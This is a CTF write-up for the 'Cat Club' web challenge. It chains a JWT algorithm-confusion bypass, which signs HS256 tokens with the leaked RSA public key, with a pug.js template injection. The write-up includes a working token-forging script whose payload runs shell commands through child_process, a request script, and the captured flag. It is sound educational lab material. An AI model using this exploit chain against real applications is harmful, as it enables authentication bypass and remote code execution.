# 1337Up Live CTF

## Cat Club

> https://ctfd-status.ctf.intigriti.io/catclub

JWT algorithm confusion & pug.js SSTI.

## Approach

After registering, notice that `/cats` page will displays the user's username, we can find a SSTI vulnerability in the source code.

```js
if (typeof req.user != "undefined") {
  template = template.replace(/guest/g, req.user);
}
```

The regular registration method does not allow non-numeric and alphabetic characters. Consider constructing a JWT token with the username as the payload directly.

`/jwks.json` leaks the publicKey, and the server's function for verifying JWT is:

```js
function signJWT(payload) {
  return new Promise((resolve, reject) => {
    jwt.encode(privateKey, payload, "RS256", (err, token) => {
      if (err) {
        return reject(new Error("Error encoding token"));
      }
      resolve(token);
    });
  });
}

function verifyJWT(token) {
  return new Promise((resolve, reject) => {
    if (!token || typeof token !== "string" || token.split(".").length !== 3) {
      return reject(new Error("Invalid token format"));
    }

    jwt.decode(publicKey, token, (err, payload, header) => {
      if (err) {
        return reject(new Error("Invalid or expired token"));
      }

      if (header.alg.toLowerCase() === "none") {
        return reject(new Error("Algorithm 'none' is not allowed"));
      }

      resolve(payload);
    });
  });
}
```

RSA's private key cannot be obtained, but the above verification has an JWT algorithm confusion vulnerability. We can create a signature using the publicKey and HS256 algorithm by ourselves. At this point, the server's verification logic is still using publicKey to verify, but the algorithm has been specified as HS256, so it can pass. The code to generate the token is:

```js
const fs = require("fs");
const jwt = require("json-web-token");
const jwkToPem = require("jwk-to-pem");

// const publicKey = fs.readFileSync("public_key.pem", "utf8");

const publicKey = jwkToPem({
  kty: "RSA",
  n: "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
  e: "AQAB",
  alg: "RS256",
  use: "sig",
});

function signJWT(payload) {
  return new Promise((resolve, reject) => {
    jwt.encode(publicKey, payload, "HS256", (err, token) => {
      if (err) {
        return reject(new Error("Error encoding token"));
      }
      resolve(token);
    });
  });
}

signJWT({
  // username: "#{global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()}"
  username:
    "#{global.process.mainModule.constructor._load('child_process').execSync('cat /flag_Gx4wVbEc1fxN9ztM.txt').toString()}",
}).then((token) => {
  console.log(token);
  fs.writeFileSync("token.txt", token);
});
```

Exploit:

```python
import requests

url = f"https://catclub-2.ctf.intigriti.io/cats"

with open("catclub_exp/token.txt") as f:
    token = f.read().strip()
resp = requests.get(url, cookies={"token": token})

# print(resp.text)
print(resp.text.split('alt="Club Logo"></nav></header><div class="content"><h1>')[1])
```

## Flag

```
INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}
```
